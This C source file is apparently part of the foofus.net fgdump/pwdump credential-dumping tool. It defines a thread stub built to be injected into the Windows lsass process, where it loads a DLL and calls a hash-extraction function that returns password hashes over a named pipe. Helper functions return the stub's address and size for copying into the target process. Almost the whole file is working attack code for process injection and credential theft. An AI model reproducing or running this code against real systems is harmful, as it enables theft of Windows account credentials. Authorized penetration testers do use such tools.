/*
Copyright ©2008 foofus.net

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License Version 2, as published
by the Free Software Foundation.

This program is distributed in the hope that it will be useful, but WITHOUT
ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
FITNESS FOR A PARTICULAR PURPOSE.  The program may contain errors that
could cause failures or loss of data, and may be incomplete or contain
inaccuracies.  By using the program, you expressly acknowledge and agree
that use of the program, or any portion thereof, is at your sole and entire
risk.  You are solely responsible for determining the appropriateness of
using, copying, distributing and modifying the program and assume all risks
of exercising your rights under the license, compliance with all applicable
laws, damage to or loss of data, programs or equipment, and unavailability
or interruption of operations.   THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
EXPRESSLY DISCLAIM ALL WARRANTIES AND/OR CONDITIONS, EXPRESS OR IMPLIED,
INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES AND/OR CONDITIONS OF
MERCHANTABILITY, OF SATISFACTORY QUALITY, OF FITNESS FOR A PARTICULAR
PURPOSE, OF ACCURACY, OF QUIET ENJOYMENT, AND NONINFRINGEMENT OF THIRD
PARTY RIGHTS.  THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES DO NOT WARRANT
AGAINST INTERFERENCE WITH YOUR ENJOYMENT OF THE PROGRAM, THAT THE FUNCTIONS
CONTAINED IN THE PROGRAM WILL MEET YOUR NEEDS, THAT THE OPERATION OF THE
PROGRAM WILL BE UNINTERRUPTED OR ERROR-FREE, OR THAT DEFECTS IN THE PROGRAM
WILL BE CORRECTED. THE DISCLAIMER OF WARRANTY CONSTITUTES AN ESSENTIAL PART
OF THE LICENSE TO USE THE PROGRAM AND NO USE OF THE PROGRAM IS AUTHORIZED
EXCEPT UNDER THE DISCLAIMER.  ALSO, SOME JURISDICTIONS DO NOT ALLOW THE
EXCLUSION OR LIMITATION OF INCIDENTAL OR CONSEQUENTIAL DAMAGES, SO THAT
EXCLUSION AND LIMITATION MAY NOT APPLY TO YOU.  See the GNU General Public
License Version 2 for more details.

You should have received a copy of the GNU General Public License Version 2
along with this program; if not, write to the Free Software Foundation, 59
Temple Place, Suite 330, Boston, MA 02111-1307 USA.
*/

/*
	Special thanks to Soaring Moe! for 64-bit contributions!
*/

#include "lsassthreadstub.h"

#pragma check_stack(off)
#pragma runtime_checks( "", off )

// This is the function used to load the dll in lsass
static DWORD __stdcall LsaThreadFunc(struct ThreadData* pData)
{
    HINSTANCE hDll;
    pGetHashFunc pGetHash;
    DWORD rc = -1;

	char sz[5];

	sz[0] = 'L';
	sz[2] = 13;
	sz[3] = 10;
	sz[4] = 0;

	sz[1] = 0x30;
	//pData->pOutputDebugString(sz);

	hDll = pData->pLoadLibrary(pData->szDllName);

	if(hDll)
    {
       rc = -2;
        pGetHash = (pGetHashFunc)pData->pGetProcAddress(hDll, pData->szFuncName);
     
		sz[1] = 0x31;
		//pData->pOutputDebugString(sz);
		if(pGetHash)
		{
			sz[1] = 0x32;
			//pData->pOutputDebugString(sz);
            rc = pGetHash(pData->szPipeName, pData->szCurrentDirectory, pData->byteKey, pData->dwKeyLength, pData->bSkipHistories);
		}
		sz[1] = 0x33;
		//pData->pOutputDebugString(sz);
        pData->pFreeLibrary(hDll);
	}
	sz[1] = 0x34;
	//pData->pOutputDebugString(sz);

	return rc;
}


// Dummy function used to get the address after LsaThreadFunc
static void DummyFunc()
{
    return;
}

#pragma runtime_checks( "", restore )
#pragma check_stack()

SIZE_T GetLsaThreadFuncSize()
{
	SIZE_T sizetPtr = (SIZE_T) ((DWORD64) DummyFunc - (DWORD64) LsaThreadFunc);
	return sizetPtr;
}

PVOID GetLsaThreadFuncPtr()
{
	return (PVOID) LsaThreadFunc;
}
